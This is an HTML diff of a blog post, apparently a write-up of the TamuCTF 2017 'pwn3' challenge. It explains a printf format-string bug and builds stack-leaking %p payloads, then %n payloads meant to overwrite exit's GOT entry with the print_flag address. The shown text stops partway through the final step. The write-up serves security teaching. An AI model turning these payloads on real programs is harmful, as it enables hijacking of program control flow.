@@ -92,94 +92,98 @@ ga('send', 'pageview');
 <p><img src="/assets/TamuCTF2017/pwn3/1-pwn3_description.png" alt="Pwn3 challenge description" /></p>
 
 <p>And here we are, with another pwning challenge 😁.</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ wget -q https://github.com/BlackHoods/BlackHoods.github.io/tree/master/assets/TamuCTF2017/pwn3
-</span><span class="">$ r2 pwn3</span></code></pre>
-</div>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ wget -q https://github.com/BlackHoods/BlackHoods.github.io/tree/master/assets/TamuCTF2017/pwn3
+$ r2 pwn3
+</code></pre></div>
+
 <p>Once downloaded and opened with radare2, go for it and list its functions.</p>
 
-<div class="highlight"><pre class="chroma"><code class="language-r2" data-lang="r2"><span class="">[0x080484b0]&gt; aaa
-</span><span class="">[x] Analyze all flags starting with sym. and entry0 (aa)
-</span><span class="">[x] Analyze len bytes of instructions for references (aar)
-</span><span class="">[x] Analyze function calls (aac)
-</span><span class="">[x] Use -AA or aaaa to perform additional experimental analysis.
-</span><span class="">[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
-</span><span class="">[0x080484b0]&gt; afl
-</span><span class="">0x080483d0    3 35           sym._init
-</span><span class="">0x08048410    1 6            sym.imp.printf
-</span><span class="">0x08048420    1 6            sym.imp.gets
-</span><span class="">0x08048430    1 6            sym.imp._IO_getc
-</span><span class="">0x08048440    1 6            sym.imp.puts
-</span><span class="">0x08048450    1 6            sym.imp.exit
-</span><span class="">0x08048460    1 6            sym.imp.__libc_start_main
-</span><span class="">0x08048470    1 6            sym.imp.setvbuf
-</span><span class="">0x08048480    1 6            sym.imp.fopen
-</span><span class="">0x08048490    1 6            sym.imp.putchar
-</span><span class="">0x080484a0    1 6            sub.__gmon_start___252_4a0
-</span><span class="">0x080484b0    1 33           entry0
-</span><span class="">0x080484e0    1 4            sym.__x86.get_pc_thunk.bx
-</span><span class="">0x080484f0    4 43           sym.deregister_tm_clones
-</span><span class="">0x08048520    4 53           sym.register_tm_clones
-</span><span class="">0x08048560    3 30           sym.__do_global_dtors_aux
-</span><span class="">0x08048580    4 43   -&gt; 40   sym.frame_dummy
-</span><span class="hl"><span class="">0x080485ab    4 103          sym.print_flag
-</span></span><span class="hl"><span class="">0x08048612    1 102          sym.main
-</span></span><span class="">0x08048680    4 93           sym.__libc_csu_init
-</span><span class="">0x080486e0    1 2            sym.__libc_csu_fini
-</span><span class="">0x080486e4    1 20           sym._fini
-</span><span class="">[0x080484b0]&gt; </span></code></pre>
-</div>
-<div class="highlight"><pre class="chroma"><code class="language-r2" data-lang="r2"><span class="">[0x080484b0]&gt; axt sym.print_flag
-</span><span class="">[0x080484b0]&gt;</span></code></pre>
-</div>
+<div class="highlight"><pre><code class="language-r2" data-lang="r2"><span></span>[<span class="mh">0x080484b0</span>]<span class="o">&gt;</span> <span class="nf">aaa</span>
+[x] Analyze all flags starting with sym. and entry0 (aa)
+[x] Analyze len bytes of instructions for references (aar)
+[x] Analyze function calls (aac)
+[x] Use -AA or aaaa to perform additional experimental analysis.
+[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
+[<span class="mh">0x080484b0</span>]<span class="o">&gt;</span> <span class="nf">afl</span>
+<span class="s">0x080483d0</span><span class="mh">    3 35           </span>sym._init
+<span class="s">0x08048410</span><span class="mh">    1 6            </span>sym.imp.printf
+<span class="s">0x08048420</span><span class="mh">    1 6            </span>sym.imp.gets
+<span class="s">0x08048430</span><span class="mh">    1 6            </span>sym.imp._IO_getc
+<span class="s">0x08048440</span><span class="mh">    1 6            </span>sym.imp.puts
+<span class="s">0x08048450</span><span class="mh">    1 6            </span>sym.imp.exit
+<span class="s">0x08048460</span><span class="mh">    1 6            </span>sym.imp.__libc_start_main
+<span class="s">0x08048470</span><span class="mh">    1 6            </span>sym.imp.setvbuf
+<span class="s">0x08048480</span><span class="mh">    1 6            </span>sym.imp.fopen
+<span class="s">0x08048490</span><span class="mh">    1 6            </span>sym.imp.putchar
+<span class="s">0x080484a0</span><span class="mh">    1 6            </span>sub.__gmon_start___252_4a0
+<span class="s">0x080484b0</span><span class="mh">    1 33           </span>entry0
+<span class="s">0x080484e0</span><span class="mh">    1 4            </span>sym.__x86.get_pc_thunk.bx
+<span class="s">0x080484f0</span><span class="mh">    4 43           </span>sym.deregister_tm_clones
+<span class="s">0x08048520</span><span class="mh">    4 53           </span>sym.register_tm_clones
+<span class="s">0x08048560</span><span class="mh">    3 30           </span>sym.__do_global_dtors_aux
+<span class="s">0x08048580</span><span class="mh">    4 43</span><span class="o">   -&gt;</span><span class="mh"> 40</span>   sym.frame_dummy
+<span class="hll"><span class="s">0x080485ab</span><span class="mh">    4 103          </span>sym.print_flag
+</span><span class="hll"><span class="s">0x08048612</span><span class="mh">    1 102          </span>sym.main
+</span><span class="s">0x08048680</span><span class="mh">    4 93           </span>sym.__libc_csu_init
+<span class="s">0x080486e0</span><span class="mh">    1 2            </span>sym.__libc_csu_fini
+<span class="s">0x080486e4</span><span class="mh">    1 20           </span>sym._fini
+[<span class="mh">0x080484b0</span>]<span class="o">&gt;</span> 
+</code></pre></div>
+
+<div class="highlight"><pre><code class="language-r2" data-lang="r2"><span></span>[<span class="mh">0x080484b0</span>]<span class="o">&gt;</span> <span class="nf">axt</span> sym.print_flag
+[<span class="mh">0x080484b0</span>]<span class="o">&gt;</span>
+</code></pre></div>
+
 <p>If you have read the <a href="/post/tamuctf2017/pwn2/">previous</a> challenge you may suspect that this one is a bit strange. Aparently, there is a function (<code>sym.print_flag</code>) that prints a flag and it is never called, just like <a href="/post/tamuctf2017/pwn2/">pwn2</a>.<br />
 Why do we have the exact same challenge again? something must be different.</p>
 
 <p>Lets start checking what is happening inside the `main function.</p>
 
-<div class="highlight"><pre class="chroma"><code class="language-r2" data-lang="r2"><span class="">[0x080484b0]&gt; pdf @ sym.main 
-</span><span class="">            ;-- main:
-</span><span class="">┌ (fcn) sym.main 102
-</span><span class="">│   sym.main ();
-</span><span class="">│           ; var int local_208h @ ebp-0x208
-</span><span class="">│           ; var int local_4h @ esp+0x4
-</span><span class="">│              ; DATA XREF from 0x080484c7 (entry0)
-</span><span class="">│           0x08048612      8d4c2404       ecx = [local_4h]            
-</span><span class="">│           0x08048616      83e4f0         esp &amp;= 0xfffffff0           
-</span><span class="">│           0x08048619      ff71fc         push dword [ecx - 4]        
-</span><span class="">│           0x0804861c      55             push ebp                    
-</span><span class="">│           0x0804861d      89e5           ebp = esp                   
-</span><span class="">│           0x0804861f      51             push ecx                    
-</span><span class="">│           0x08048620      81ec04020000   esp -= 0x204                
-</span><span class="">│           0x08048626      a138a00408     eax = dword obj.stdout      
-</span><span class="">│           0x0804862b      6a00           push 0                      
-</span><span class="">│           0x0804862d      6a00           push 0                      
-</span><span class="">│           0x0804862f      6a02           push 2                      
-</span><span class="">│           0x08048631      50             push eax                    
-</span><span class="">│         ; int setvbuf(FILE*stream, char*buf, int mode, size_t size)
-</span><span class="">│           0x08048632      e839feffff     sym.imp.setvbuf ()          
-</span><span class="">│           0x08048637      83c410         esp += 0x10                 
-</span><span class="">│           0x0804863a      83ec0c         esp -= 0xc                  
-</span><span class="">│           0x0804863d      682d870408     push str.Enter_a_word_to_be_echoed:
-</span><span class="">│         ; int puts(const char *s)
-</span><span class="">│           0x08048642      e8f9fdffff     sym.imp.puts ()             
-</span><span class="">│           0x08048647      83c410         esp += 0x10                 
-</span><span class="">│           0x0804864a      83ec0c         esp -= 0xc                  
-</span><span class="">│           0x0804864d      8d85f8fdffff   eax = [local_208h]          
-</span><span class="">│           0x08048653      50             push eax                    
-</span><span class="">│         ; char*gets(char *s)
-</span><span class="hl"><span class="">│           0x08048654      e8c7fdffff     sym.imp.gets ()             
-</span></span><span class="">│           0x08048659      83c410         esp += 0x10                 
-</span><span class="">│           0x0804865c      83ec0c         esp -= 0xc                  
-</span><span class="">│           0x0804865f      8d85f8fdffff   eax = [local_208h]          
-</span><span class="">│           0x08048665      50             push eax                    
-</span><span class="">│         ; int printf(const char *format)
-</span><span class="hl"><span class="">│           0x08048666      e8a5fdffff     sym.imp.printf ()           
-</span></span><span class="">│           0x0804866b      83c410         esp += 0x10                 
-</span><span class="">│           0x0804866e      83ec0c         esp -= 0xc                  
-</span><span class="">│           0x08048671      6a00           push 0                      
-</span><span class="">│         ; void exit(int status)
-</span><span class="hl"><span class="">└           0x08048673      e8d8fdffff     sym.imp.exit ()             </span></span></code></pre>
-</div>
+<div class="highlight"><pre><code class="language-r2" data-lang="r2"><span></span>[<span class="mh">0x080484b0</span>]<span class="o">&gt;</span> <span class="nf">pdf</span> @ sym.main 
+<span class="k"> </span>           <span class="c">;-- main:</span>
+<span class="k">┌</span> (<span class="o">fcn</span>) <span class="k">sym</span><span class="o">.</span>main <span class="m">102</span>
+<span class="k">│</span>   <span class="k">sym</span><span class="o">.</span>main ();
+<span class="k">│</span>           <span class="c">; var int local_208h @ ebp-0x208</span>
+<span class="k">│</span>           <span class="c">; var int local_4h @ esp+0x4</span>
+<span class="k">│</span>              <span class="c">; DATA XREF from 0x080484c7 (entry0)</span>
+<span class="k">│</span>           <span class="s">0x08048612</span>      8d4c2404       <span class="k">ecx</span> <span class="o">=</span> [<span class="k">local_4h</span>]            
+<span class="k">│</span>           <span class="s">0x08048616</span>      83e4f0         <span class="k">esp</span> <span class="o">&amp;=</span> <span class="mh">0xfffffff0</span>           
+<span class="k">│</span>           <span class="s">0x08048619</span>      ff71fc         <span class="k">push</span> dword [<span class="k">ecx</span> <span class="o">-</span> <span class="m">4</span>]        
+<span class="k">│</span>           <span class="s">0x0804861c</span>      55             <span class="k">push</span> <span class="k">ebp</span>                    
+<span class="k">│</span>           <span class="s">0x0804861d</span>      89e5           <span class="k">ebp</span> <span class="o">=</span> <span class="k">esp</span>                   
+<span class="k">│</span>           <span class="s">0x0804861f</span>      51             <span class="k">push</span> <span class="k">ecx</span>                    
+<span class="k">│</span>           <span class="s">0x08048620</span>      81ec04020000   <span class="k">esp</span> <span class="o">-=</span> <span class="mh">0x204</span>                
+<span class="k">│</span>           <span class="s">0x08048626</span>      a138a00408     <span class="k">eax</span> <span class="o">=</span> dword <span class="k">obj</span><span class="o">.</span>stdout      
+<span class="k">│</span>           <span class="s">0x0804862b</span>      6a00           <span class="k">push</span> <span class="m">0</span>                      
+<span class="k">│</span>           <span class="s">0x0804862d</span>      6a00           <span class="k">push</span> <span class="m">0</span>                      
+<span class="k">│</span>           <span class="s">0x0804862f</span>      6a02           <span class="k">push</span> <span class="m">2</span>                      
+<span class="k">│</span>           <span class="s">0x08048631</span>      50             <span class="k">push</span> <span class="k">eax</span>                    
+<span class="k">│</span>         <span class="c">; int setvbuf(FILE*stream, char*buf, int mode, size_t size)</span>
+<span class="k">│</span>           <span class="s">0x08048632</span>      e839feffff     <span class="k">sym</span><span class="o">.</span><span class="k">imp</span><span class="o">.</span>setvbuf ()          
+<span class="k">│</span>           <span class="s">0x08048637</span>      83c410         <span class="k">esp</span> <span class="o">+=</span> <span class="mh">0x10</span>                 
+<span class="k">│</span>           <span class="s">0x0804863a</span>      83ec0c         <span class="k">esp</span> <span class="o">-=</span> <span class="mh">0xc</span>                  
+<span class="k">│</span>           <span class="s">0x0804863d</span>      682d870408     <span class="k">push</span> <span class="k">str</span><span class="o">.</span>Enter_a_word_to_be_echoed:
+<span class="k">│</span>         <span class="c">; int puts(const char *s)</span>
+<span class="k">│</span>           <span class="s">0x08048642</span>      e8f9fdffff     <span class="k">sym</span><span class="o">.</span><span class="k">imp</span><span class="o">.</span>puts ()             
+<span class="k">│</span>           <span class="s">0x08048647</span>      83c410         <span class="k">esp</span> <span class="o">+=</span> <span class="mh">0x10</span>                 
+<span class="k">│</span>           <span class="s">0x0804864a</span>      83ec0c         <span class="k">esp</span> <span class="o">-=</span> <span class="mh">0xc</span>                  
+<span class="k">│</span>           <span class="s">0x0804864d</span>      8d85f8fdffff   <span class="k">eax</span> <span class="o">=</span> [<span class="k">local_208h</span>]          
+<span class="k">│</span>           <span class="s">0x08048653</span>      50             <span class="k">push</span> <span class="k">eax</span>                    
+<span class="k">│</span>         <span class="c">; char*gets(char *s)</span>
+<span class="hll"><span class="k">│</span>           <span class="s">0x08048654</span>      e8c7fdffff     <span class="k">sym</span><span class="o">.</span><span class="k">imp</span><span class="o">.</span>gets ()             
+</span><span class="k">│</span>           <span class="s">0x08048659</span>      83c410         <span class="k">esp</span> <span class="o">+=</span> <span class="mh">0x10</span>                 
+<span class="k">│</span>           <span class="s">0x0804865c</span>      83ec0c         <span class="k">esp</span> <span class="o">-=</span> <span class="mh">0xc</span>                  
+<span class="k">│</span>           <span class="s">0x0804865f</span>      8d85f8fdffff   <span class="k">eax</span> <span class="o">=</span> [<span class="k">local_208h</span>]          
+<span class="k">│</span>           <span class="s">0x08048665</span>      50             <span class="k">push</span> <span class="k">eax</span>                    
+<span class="k">│</span>         <span class="c">; int printf(const char *format)</span>
+<span class="hll"><span class="k">│</span>           <span class="s">0x08048666</span>      e8a5fdffff     <span class="k">sym</span><span class="o">.</span><span class="k">imp</span><span class="o">.</span>printf ()           
+</span><span class="k">│</span>           <span class="s">0x0804866b</span>      83c410         <span class="k">esp</span> <span class="o">+=</span> <span class="mh">0x10</span>                 
+<span class="k">│</span>           <span class="s">0x0804866e</span>      83ec0c         <span class="k">esp</span> <span class="o">-=</span> <span class="mh">0xc</span>                  
+<span class="k">│</span>           <span class="s">0x08048671</span>      6a00           <span class="k">push</span> <span class="m">0</span>                      
+<span class="k">│</span>         <span class="c">; void exit(int status)</span>
+<span class="hll"><span class="k">└</span>           <span class="s">0x08048673</span>      e8d8fdffff     <span class="k">sym</span><span class="o">.</span><span class="k">imp</span><span class="o">.</span>exit ()             
+</span></code></pre></div>
+
 
 <p>Well, it seems the execution is pretty straightforward:</p>
 
@@ -201,14 +205,15 @@ Why do we have the exact same challenge again? something must be different.</p>
 
 <p>But, wait a moment, that `printf call is a bit strange.</p>
 
-<div class="highlight"><pre class="chroma"><code class="language-r2" data-lang="r2"><span class="">[0x080484b0]&gt; pd 5 @ 0x08048659
-</span><span class="">│           0x08048659      83c410         esp += 0x10                 
-</span><span class="">│           0x0804865c      83ec0c         esp -= 0xc                  
-</span><span class="">│           0x0804865f      8d85f8fdffff   eax = [local_208h]          
-</span><span class="hl"><span class="">│           0x08048665      50             push eax         
-</span></span><span class="hl"><span class="">│         ; int printf(const char *format)            
-</span></span><span class="hl"><span class="">│           0x08048666      e8a5fdffff     sym.imp.printf ()</span></span></code></pre>
-</div>
+<div class="highlight"><pre><code class="language-r2" data-lang="r2"><span></span>[<span class="mh">0x080484b0</span>]<span class="o">&gt;</span> <span class="nf">pd</span> 5 @ 0x08048659
+<span class="k">│</span>           <span class="s">0x08048659</span>      83c410         <span class="k">esp</span> <span class="o">+=</span> <span class="mh">0x10</span>                 
+<span class="k">│</span>           <span class="s">0x0804865c</span>      83ec0c         <span class="k">esp</span> <span class="o">-=</span> <span class="mh">0xc</span>                  
+<span class="k">│</span>           <span class="s">0x0804865f</span>      8d85f8fdffff   <span class="k">eax</span> <span class="o">=</span> [<span class="k">local_208h</span>]          
+<span class="hll"><span class="k">│</span>           <span class="s">0x08048665</span>      50             <span class="k">push</span> <span class="k">eax</span>         
+</span><span class="hll"><span class="k">│</span>         <span class="c">; int printf(const char *format)            </span>
+</span><span class="hll"><span class="k">│</span>           <span class="s">0x08048666</span>      e8a5fdffff     <span class="k">sym</span><span class="o">.</span><span class="k">imp</span><span class="o">.</span>printf ()
+</span></code></pre></div>
+
 
 <p>One push!<br />
 Thats strange because normally <code>printf</code> accepts two arguments at least. It should look something like this:</p>
@@ -221,11 +226,12 @@ If user input is used as the first argument of <code>printf</code>, it means tha
 </blockquote>
 
 <p>Well, with normals inputs, <code>printf</code> will behave &ldquo;corretly&rdquo;, BUT look what happens if you provide format modifiers in your input (<code>input = &quot;%p %p %p %p&quot;</code>):</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ ./pwn3 
-</span><span class="">Enter a word to be echoed:
-</span><span class="">%p %p %p %p
-</span><span class="">0x2 </span><span class="o">(</span><span class="">nil</span><span class="o">)</span><span class=""> </span><span class="o">(</span><span class="">nil</span><span class="o">)</span><span class=""> 0x25207025</span></code></pre>
-</div>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ ./pwn3 
+Enter a word to be echoed:
+%p %p %p %p
+0x2 <span class="o">(</span>nil<span class="o">)</span> <span class="o">(</span>nil<span class="o">)</span> 0x25207025
+</code></pre></div>
+
 <p><code>printf</code> is leaking information of the stack!<br />
 We are being able to see the content of the stack remotely!</p>
 
@@ -241,17 +247,19 @@ We are being able to see the content of the stack remotely!</p>
 <code>%n</code> modifier writes <strong>the LENGTH of the string</strong> in the address provided by the user <strong>BEFORE</strong> the modifier itself.</p>
 
 <p>Lets see an example:</p>
-<div class="highlight"><pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="kt">int</span><span class=""> </span><span class="n">c</span><span class="p">;</span><span class="">
-</span><span class=""></span><span class="n">printf</span><span class="p">(</span><span class="sa"></span><span class="s">&#34;12345 %n blah</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class=""> </span><span class="o">&amp;</span><span class="n">c</span><span class="p">);</span><span class="">
-</span><span class=""></span><span class="o">//</span><span class=""> </span><span class="n">Here</span><span class=""> </span><span class="n">c</span><span class=""> </span><span class="n">will</span><span class=""> </span><span class="n">be</span><span class=""> </span><span class="mi">6</span><span class=""> </span><span class="n">because</span><span class=""> </span><span class="sa"></span><span class="s">&#34;12345 &#34;</span><span class=""> </span><span class="n">is</span><span class=""> </span><span class="mi">6</span><span class=""> </span><span class="n">bytes</span><span class=""> </span><span class="n">length</span><span class="o">!</span></code></pre>
-</div>
+<div class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span></span><span class="kt">int</span> <span class="n">c</span><span class="p">;</span>
+<span class="n">printf</span><span class="p">(</span><span class="s">&quot;12345 %n blah</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">c</span><span class="p">);</span>
+<span class="c1">// Here c will be 6 because &quot;12345 &quot; is 6 bytes length!</span>
+</code></pre></div>
+
 <p>So, lets try all of this out, the idea is to send a memory address, locate where is it into the stack and use the <code>%n</code> format parameter to save data in the memory address we provide.</p>
 
 <p>We will input 4 As (&ldquo;AAAA&rdquo;, which will be written in memory as <code>0x41414141</code> and will be easier to locate) and several <code>%p</code> to see the stack content and find out where the &ldquo;AAAA&rdquo; string is allocated inside of the stack.</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ python -c </span><span class="s1">&#39;print(&#34;AAAA&#34; + &#34;%p %p %p %p %p &#34;)&#39;</span><span class=""> </span><span class="p">|</span><span class=""> ./pwn3</span><span class="p">;</span><span class=""> </span><span class="nb">echo</span><span class="">
-</span><span class="">Enter a word to be echoed:
-</span><span class="">AAAA0x2 </span><span class="o">(</span><span class="">nil</span><span class="o">)</span><span class=""> </span><span class="o">(</span><span class="">nil</span><span class="o">)</span><span class=""> 0x41414141 0x25207025</span></code></pre>
-</div>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ python -c <span class="s1">&#39;print(&quot;AAAA&quot; + &quot;%p %p %p %p %p &quot;)&#39;</span> <span class="p">|</span> ./pwn3<span class="p">;</span> <span class="nb">echo</span>
+Enter a word to be echoed:
+AAAA0x2 <span class="o">(</span>nil<span class="o">)</span> <span class="o">(</span>nil<span class="o">)</span> 0x41414141 0x25207025
+</code></pre></div>
+
 <p>Good, it is in the 4<sup>th</sup> <code>%p</code>. But imagine if the address was in the 300<sup>th</sup> position. We had to write 300 times <code>%p</code>!</p>
 
 <blockquote>
@@ -259,10 +267,11 @@ We are being able to see the content of the stack remotely!</p>
 </blockquote>
 
 <p>Indeed, It does exist another way of printing that 4<sup>th</sup> value much more convenient for us: the index operator.</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ python -c </span><span class="s1">&#39;print(&#34;AAAA&#34; + &#34;%4$p&#34;)&#39;</span><span class=""> </span><span class="p">|</span><span class=""> ./pwn3</span><span class="p">;</span><span class=""> </span><span class="nb">echo</span><span class="">
-</span><span class="">Enter a word to be echoed:
-</span><span class="">AAAA0x41414141</span></code></pre>
-</div>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ python -c <span class="s1">&#39;print(&quot;AAAA&quot; + &quot;%4$p&quot;)&#39;</span> <span class="p">|</span> ./pwn3<span class="p">;</span> <span class="nb">echo</span>
+Enter a word to be echoed:
+AAAA0x41414141
+</code></pre></div>
+
 <p>Basically using <code>&lt;number&gt;$</code> we are able to select the position of the data we want to select.</p>
 
 <blockquote>
@@ -280,43 +289,46 @@ Here is where the GOT table enters in scene.</p>
 
 <p>Because all of these functions are being used inside our binary, we could try to modify the value which points to one of them, this way we will be able to alter the flow of the execution.
 For that, we need to know, the specific function (and its address) of the GOT we want to modify. The following command will help us with that task.</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ objdump -R pwn3
-</span><span class="">
-</span><span class="">pwn3:     file format elf32-i386
-</span><span class="">
-</span><span class="">DYNAMIC RELOCATION RECORDS
-</span><span class="">OFFSET   TYPE              VALUE 
-</span><span class="">08049ffc R_386_GLOB_DAT    __gmon_start__
-</span><span class="">0804a038 R_386_COPY        stdout@@GLIBC_2.0
-</span><span class="">0804a00c R_386_JUMP_SLOT   printf@GLIBC_2.0
-</span><span class="">0804a010 R_386_JUMP_SLOT   gets@GLIBC_2.0
-</span><span class="">0804a014 R_386_JUMP_SLOT   _IO_getc@GLIBC_2.0
-</span><span class="">0804a018 R_386_JUMP_SLOT   puts@GLIBC_2.0
-</span><span class="">0804a01c R_386_JUMP_SLOT   exit@GLIBC_2.0
-</span><span class="">0804a020 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
-</span><span class="">0804a024 R_386_JUMP_SLOT   setvbuf@GLIBC_2.0
-</span><span class="">0804a028 R_386_JUMP_SLOT   fopen@GLIBC_2.1
-</span><span class="">0804a02c R_386_JUMP_SLOT   putchar@GLIBC_2.0</span></code></pre>
-</div>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ objdump -R pwn3
+
+pwn3:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE 
+08049ffc R_386_GLOB_DAT    __gmon_start__
+0804a038 R_386_COPY        stdout@@GLIBC_2.0
+0804a00c R_386_JUMP_SLOT   printf@GLIBC_2.0
+0804a010 R_386_JUMP_SLOT   gets@GLIBC_2.0
+0804a014 R_386_JUMP_SLOT   _IO_getc@GLIBC_2.0
+0804a018 R_386_JUMP_SLOT   puts@GLIBC_2.0
+0804a01c R_386_JUMP_SLOT   exit@GLIBC_2.0
+0804a020 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
+0804a024 R_386_JUMP_SLOT   setvbuf@GLIBC_2.0
+0804a028 R_386_JUMP_SLOT   fopen@GLIBC_2.1
+0804a02c R_386_JUMP_SLOT   putchar@GLIBC_2.0
+</code></pre></div>
+
 <p>But not all of them are good for us, the function to be replaced must be executed <strong>AFTER</strong> the vulnerable <code>printf</code> call.<br />
 Radare2 will gave us this answer before.</p>
 
-<div class="highlight"><pre class="chroma"><code class="language-r2" data-lang="r2"><span class="">│           0x08048666      e8a5fdffff     sym.imp.printf ()           
-</span><span class="">│           0x0804866b      83c410         esp += 0x10                 
-</span><span class="">│           0x0804866e      83ec0c         esp -= 0xc                  
-</span><span class="">│           0x08048671      6a00           push 0                      
-</span><span class="">│         ; void exit(int status)
-</span><span class="hl"><span class="">└           0x08048673      e8d8fdffff     sym.imp.exit ()  </span></span></code></pre>
-</div>
+<div class="highlight"><pre><code class="language-r2" data-lang="r2"><span></span><span class="k">│</span>           <span class="s">0x08048666</span>      e8a5fdffff     <span class="k">sym</span><span class="o">.</span><span class="k">imp</span><span class="o">.</span>printf ()           
+<span class="k">│</span>           <span class="s">0x0804866b</span>      83c410         <span class="k">esp</span> <span class="o">+=</span> <span class="mh">0x10</span>                 
+<span class="k">│</span>           <span class="s">0x0804866e</span>      83ec0c         <span class="k">esp</span> <span class="o">-=</span> <span class="mh">0xc</span>                  
+<span class="k">│</span>           <span class="s">0x08048671</span>      6a00           <span class="k">push</span> <span class="m">0</span>                      
+<span class="k">│</span>         <span class="c">; void exit(int status)</span>
+<span class="hll"><span class="k">└</span>           <span class="s">0x08048673</span>      e8d8fdffff     <span class="k">sym</span><span class="o">.</span><span class="k">imp</span><span class="o">.</span>exit ()  
+</span></code></pre></div>
+
 
 <p>We have a winner! exit() function.</p>
 
 <p>Finally, we just need to know the value to write in that address. That value is nothing more than a memory address that contains the code we want to be executed. Could you imagine of what value it can be?
 Lets check again the previous output of r2 😃 .</p>
 
-<div class="highlight"><pre class="chroma"><code class="language-r2" data-lang="r2"><span class="hl"><span class="">0x080485ab    4 103          sym.print_flag
-</span></span><span class="">0x08048612    1 102          sym.main</span></code></pre>
-</div>
+<div class="highlight"><pre><code class="language-r2" data-lang="r2"><span></span><span class="hll"><span class="s">0x080485ab</span><span class="mh">    4 103          </span>sym.print_flag
+</span><span class="s">0x08048612</span><span class="mh">    1 102          </span>sym.main
+</code></pre></div>
+
 
 <blockquote>
 <p>That&rsquo;s it! the address of <code>sym.print_flag</code>! (<code>0x080485ab</code>)</p>
@@ -331,24 +343,25 @@ $ python -c 'print(&quot;AAAA&quot; + &quot;%4$p&quot;)' | ./pwn3; echo
 </code><br /></li>
 
 <li><p>We have the address to write to (by the way, emember about the <a href="https://en.wikipedia.org/wiki/Endianness">endianess</a>).</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ python -c </span><span class="s1">&#39;print(&#34;\x1c\xa0\x04\x08&#34; + &#34;%4$p&#34;)&#39;</span><span class=""> </span><span class="p">|</span><span class=""> ./pwn3</span><span class="p">;</span><span class=""> echo</span></code></pre>
-</div></li>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ python -c <span class="s1">&#39;print(&quot;\x1c\xa0\x04\x08&quot; + &quot;%4$p&quot;)&#39;</span> <span class="p">|</span> ./pwn3<span class="p">;</span> <span class="nb">echo</span>
+</code></pre></div></li>
 
 <li><p>And here comes the last obstacle: We need to write the hex value <code>0x080485ab</code> through the <code>%n</code> operator.<br />
 We know <code>%n</code> can write the length of the string with preceeds itself into the provided address, so at a first glance we could think in writing <code>134,514,087</code> characters (<code>134,514,091 - 4</code> because we already wrote a 4-byte address):</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ python -c </span><span class="s1">&#39;print(&#34;\x1c\xa0\x04\x08&#34; + &#34;A&#34;*134514087 + &#34;%4$n&#34;)&#39;</span><span class=""> </span><span class="p">|</span><span class=""> ./pwn3</span><span class="p">;</span><span class=""> </span><span class="nb">echo</span><span class="">
-</span><span class="">Enter a word to be echoed:
-</span><span class="">Traceback </span><span class="o">(</span><span class="">most recent call last</span><span class="o">)</span><span class="">:
-</span><span class="">File </span><span class="s2">&#34;&lt;string&gt;&#34;</span><span class="">, line </span><span class="m">1</span><span class="">, in &lt;module&gt;
-</span><span class="">IOError: </span><span class="o">[</span><span class="">Errno </span><span class="m">32</span><span class="o">]</span><span class=""> Broken pipe
-</span><span class="">Segmentation fault</span></code></pre>
-</div></li>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ python -c <span class="s1">&#39;print(&quot;\x1c\xa0\x04\x08&quot; + &quot;A&quot;*134514087 + &quot;%4$n&quot;)&#39;</span> <span class="p">|</span> ./pwn3<span class="p">;</span> <span class="nb">echo</span>
+Enter a word to be echoed:
+Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
+File <span class="s2">&quot;&lt;string&gt;&quot;</span>, line <span class="m">1</span>, in &lt;module&gt;
+IOError: <span class="o">[</span>Errno <span class="m">32</span><span class="o">]</span> Broken pipe
+Segmentation fault
+</code></pre></div></li>
 </ol>
 
 <p>But aparently that is just to much for the pipe.<br />
 We could try the <code>%&lt;times&gt;x</code> parameter. It just print as many memory bytes as we tell it to, so we do not have to generate them with python.</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ python -c </span><span class="s1">&#39;print(&#34;\x1c\xa0\x04\x08&#34; + &#34;%134514087x&#34; + &#34;%4$n&#34;)&#39;</span><span class=""> </span><span class="p">|</span><span class=""> ./pwn3</span><span class="p">;</span><span class=""> echo</span></code></pre>
-</div>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ python -c <span class="s1">&#39;print(&quot;\x1c\xa0\x04\x08&quot; + &quot;%134514087x&quot; + &quot;%4$n&quot;)&#39;</span> <span class="p">|</span> ./pwn3<span class="p">;</span> <span class="nb">echo</span>
+</code></pre></div>
+
 <p>Meh! too much too.<br />
 But wait a moment, there is a special paramater <code>%h</code> which does the following:</p>
 
@@ -363,18 +376,21 @@ Let&rsquo;s represent this.</p>
 <p><img src="/assets/TamuCTF2017/pwn3/12-pwn3_scheme.png" alt="Pwn3 Scheme" /></p>
 
 <p>Then, it makes sense that the first value to be written should be the lowest one <code>0x804-8 = 2044</code> in the address <code>0x0804a01e</code> which will be stored in the <code>4th</code> position of the stack.</p>
